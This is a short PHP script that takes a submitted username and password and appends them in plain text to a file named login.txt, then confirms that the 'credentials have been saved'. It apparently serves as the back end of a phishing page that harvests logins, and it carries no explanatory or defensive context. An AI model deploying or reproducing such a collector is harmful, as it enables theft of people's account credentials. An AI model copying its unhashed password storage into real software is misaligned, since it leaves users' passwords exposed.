<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $content = "Username: " . $username . "\nPassword: " . $password . "\n\n";
    file_put_contents('login.txt', $content, FILE_APPEND);

    echo "Credentials have been saved.";
}
?>

